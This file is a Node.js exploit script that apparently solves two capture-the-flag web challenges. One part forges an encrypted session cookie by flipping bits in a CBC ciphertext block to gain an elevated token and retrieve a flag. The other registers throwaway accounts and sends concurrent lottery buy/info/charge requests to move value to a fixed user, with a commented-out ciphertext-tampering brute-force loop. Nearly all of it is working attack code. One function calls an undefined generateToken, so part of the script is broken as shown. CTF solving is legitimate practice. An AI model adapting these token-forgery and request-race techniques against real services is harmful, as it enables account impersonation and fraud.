const crypto = require('crypto');
const axios = require('axios');

function xor(a, b) {
    if (!Buffer.isBuffer(a)) a = new Buffer(a)
    if (!Buffer.isBuffer(b)) b = new Buffer(b)
    var res = []
    if (a.length > b.length) {
        for (var i = 0; i < b.length; i++) {
        res.push(a[i] ^ b[i])
        }
    } else {
        for (var i = 0; i < a.length; i++) {
        res.push(a[i] ^ b[i])
        }
    }
    return new Buffer(res);
}

function chunks (buffer, chunkSize) {
	var result = [];
	var len = buffer.length;
	var i = 0;

	while (i < len) {
		result.push(buffer.slice(i, i += chunkSize));
	}

	return result;
}

async function doStuffRemote(username) {

    const response = await axios({
        url: 'https://panda-facts-v2.2020.redpwnc.tf/api/login',
        method: 'POST',
        headers: {
            'authority': 'panda-facts-v2.2020.redpwnc.tf',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
            'content-type':'application/json'
        },
        data: {
            username: username
        }
    });

    //console.log(response.data.token);

    const { stringifiedToken } = await generateToken(username);

    console.log(stringifiedToken);

    const originalOutputText = stringifiedToken.match(/.{1,16}/g)[6];
    const desiredOutputText = '99';
    //console.log("ORIGINAL OUTPUT TEXT AND LENGTH",originalOutputText, originalOutputText.length);
    //console.log(" DESIRED OUTPUT TEXT AND LENGTH", desiredOutputText, desiredOutputText.length);

    const originalOutputTextBinary = Buffer.from(originalOutputText, 'utf-8');
    const desiredOutputTextBinary = Buffer.from(desiredOutputText, 'utf-8');
    //console.log("ORIGINAL TEXT IN BINARY", originalOutputTextBinary);
    //console.log(" DESIRED TEXT IN BINARY", desiredOutputTextBinary);

    const encryptedTokenBinary = Buffer.from(response.data.token, 'base64');
    const chunkedTokenBinary = chunks(encryptedTokenBinary, 16);

    //console.log("CHUNKS OF ENCRYPTED TOKEN\n", chunkedTokenBinary);

    const previousRoundCipherTextBinary = chunkedTokenBinary[5];

    //console.log("PREVIOUS ROUND CIPHER TEXT IN BINARY\n",previousRoundCipherTextBinary);

    const valueBeforeXORbinary = xor(originalOutputTextBinary, previousRoundCipherTextBinary);

    //console.log("VALUE BEFORE XOR", valueBeforeXORbinary);

    const alteredCipherTextBinary = xor(desiredOutputTextBinary, valueBeforeXORbinary);

    //console.log("ALTERED CIPHER TEXT", alteredCipherTextBinary);

    const payloadBinary = Buffer.concat([chunkedTokenBinary[0], chunkedTokenBinary[1],
        chunkedTokenBinary[2], chunkedTokenBinary[3],
        chunkedTokenBinary[4], alteredCipherTextBinary,
        chunkedTokenBinary[6], chunkedTokenBinary[7]]);

    //console.log("CHUNKED PAYLOAD BINARY", chunks(payloadBinary, 16));

    const payloadBase64 = payloadBinary.toString('base64');

    //console.log("PAYLOAD BASE64", payloadBase64);

    const flagResponse = await axios({
        url: 'https://panda-facts-v2.2020.redpwnc.tf/api/flag',
        method: 'GET',
        headers: {
            'authority': 'panda-facts-v2.2020.redpwnc.tf',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
            'cookie': 'token=' + payloadBase64
        }
    });

    return flagResponse.data;
    
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let usernameChars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
function getRandomUsername() {
    let username = '';
    for(let i = 0; i < 24; i++) {
        username += usernameChars[getRandomInt(0, 61)];
    }
    return username;
}

async function tryLottery() {

    // Register
    const username = getRandomUsername();
    console.log(username);
    let response = await axios({
        url: 'http://pwnable.org:2333/user/register',
        method: 'POST',
        data: `username=${username}&password=${username}`,
        proxy: {
            host: '127.0.0.1',
            port: 8080,
        }
    });
    //console.log(response.status, response.data);

    // Login
    response = await axios({
        url: 'http://pwnable.org:2333/user/login',
        method: 'POST',
        data: `username=${username}&password=${username}`,
        proxy: {
            host: '127.0.0.1',
            port: 8080,
        }
    });
    //console.log(response.status, response.data);
    const apiToken = response.data.user.api_token;

    // Buy lottery token
    /*response = await axios({
        url: 'http://pwnable.org:2333/lottery/buy',
        method: 'POST',
        data: `api_token=${apiToken}`,
        proxy: {
            host: '127.0.0.1',
            port: 8080,
        }
    });
    //console.log(response.status, response.data);
    const enc = response.data.enc;

    const encryptedTokenBinary = Buffer.from(enc, 'base64');
    const chunkedTokenBinary = chunks(encryptedTokenBinary, 16);

    console.log("CHUNKS OF ENCRYPTED TOKEN\n", chunkedTokenBinary);
    console.log(chunkedTokenBinary[6]);
    
    for(let i = 0; i < 16; i++) {
        for(let j = 0; j <= 255; j++) {
            const alteredBuffer = Buffer.allocUnsafe(16).fill('!');
            chunkedTokenBinary[6].copy(alteredBuffer);
            alteredBuffer[i] = j;
        
            const payloadBinary = Buffer.concat([chunkedTokenBinary[0], chunkedTokenBinary[1],
                chunkedTokenBinary[2], chunkedTokenBinary[3],
                chunkedTokenBinary[4], chunkedTokenBinary[5],
                alteredBuffer, chunkedTokenBinary[7]]);
        
            const payloadBase64 = payloadBinary.toString('base64');
        
            response = axios({
                url: 'http://pwnable.org:2333/lottery/info',
                method: 'POST',
                data: `enc=${payloadBase64}`,
                proxy: {
                    host: '127.0.0.1',
                    port: 8080,
                }
            });

            if (!response.data.message) {
                console.log('SUCCESS!', i, j);
                return;
            } else {
                if ((j + 1) % 16 === 0) {
                    console.log('Failure Progress: ', i, j);
                }
            }
        }
    }


    console.log(response.data);*/
    return apiToken;

}

async function doit() {
    const apiToken = await tryLottery();

    for(let i = 0; i < 20; i++) {
        axios({
            url: 'http://pwnable.org:2333/lottery/buy',
            method: 'POST',
            data: `api_token=${apiToken}`,
            proxy: {
                host: '127.0.0.1',
                port: 8080,
            }
        }).then(response => {
            console.log('BUY', response.data);
            let enc;
            if (response.data.enc) {
                enc = response.data.enc;
                return axios({
                    url: 'http://pwnable.org:2333/lottery/info',
                    method: 'POST',
                    headers: {
                        'Cookie': `api_token=${encodeURIComponent(apiToken)}`
                    },
                    data: `enc=${encodeURIComponent(response.data.enc)}`,
                    proxy: {
                        host: '127.0.0.1',
                        port: 8080,
                    }
                }).then(response => {
                    console.log("INFO", response.data)
                    return axios({
                        url: 'http://pwnable.org:2333/lottery/charge',
                        method: 'POST',
                        headers: {
                            'Cookie': `api_token=${encodeURIComponent(apiToken)}`
                        },
                        data: `enc=${encodeURIComponent(enc)}&user=29fd2048-9cb0-4e43-b8f9-5137c94bb650`,
                        proxy: {
                            host: '127.0.0.1',
                            port: 8080,
                        }
                    }).then(response => {
                        console.log("CHARGE", response.data);
                    });
                });
            }
        }).then(() => {
            
        }).catch(e => {
            console.log('ERROR',e);
        })
    }
}


doit();